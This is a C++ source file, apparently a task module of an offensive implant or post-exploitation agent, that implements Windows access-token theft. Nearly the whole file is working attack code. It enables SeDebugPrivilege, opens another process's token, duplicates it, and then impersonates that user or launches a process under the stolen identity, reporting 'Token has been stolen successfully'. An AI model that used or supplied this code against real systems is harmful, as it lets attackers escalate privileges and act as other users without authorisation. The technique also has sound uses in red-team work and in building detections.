#include "core/task.hpp"

namespace Task::Helper::Token
{
    HANDLE GetTokenByPid(DWORD dwPid)
    {
        HANDLE hToken = NULL;
        HANDLE hProcess = NULL;

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
        if (!hProcess)
        {
            return NULL;
        }

        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
        {
            return NULL;
        }

        return hToken;
    }

    BOOL CreateProcessWithStolenToken(HANDLE hToken, LPCWSTR appName)
    {
        HANDLE hDuplToken = NULL;
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        BOOL bResults = FALSE;

        ZeroMemory(&si, sizeof(STARTUPINFOW));
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        si.cb = sizeof(STARTUPINFOW);

        bResults = DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hDuplToken
        );
        if (!bResults)
        {
            return FALSE;
        }

        bResults = CreateProcessWithTokenW(
            hDuplToken,
            LOGON_WITH_PROFILE,
            appName,
            NULL,
            0,
            NULL,
            NULL,
            &si,
            &pi
        );
        if (!bResults)
        {
            return FALSE;
        }

        return TRUE;
    }
}



namespace Task
{
    std::wstring TokenRevert()
    {
        if (!RevertToSelf())
        {
            return L"Error: Could not revert impersonation.";
        }

        return L"Success: Reverted impersonation successfully.";
    }

    // Reference:
    // https://cocomelonc.github.io/tutorial/2022/09/25/token-theft-1.html
    std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName)
    {
        HANDLE hToken = NULL;

        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Current user needs to have SeDebugPrivilege.
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        {
            return L"Error: Could not open the process token.";
        }
        if (!System::Priv::CheckPrivilege(hToken, SE_DEBUG_NAME))
        {
            if (!System::Priv::SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
            {
                return L"Error: Could not set SeDebugPrivilege to current process.";
            }
        }

        // Get access token of the specified process.
        hToken = Task::Helper::Token::GetTokenByPid(dwPid);
        if (!hToken)
        {
            return L"Error: Could not get token of the specified process.";
        }

        if (wProcName == L"login")
        {
            if (!ImpersonateLoggedOnUser(hToken))
            {
                return L"Error: Could not logon with impersonation.";
            }
        }
        else
        {
            if (!Task::Helper::Token::CreateProcessWithStolenToken(hToken, wProcName.c_str()))
            {
                return L"Error: Could not create a process with stolen token.";
            }
        }

        return L"Success: Token has been stolen successfully.";
    }
}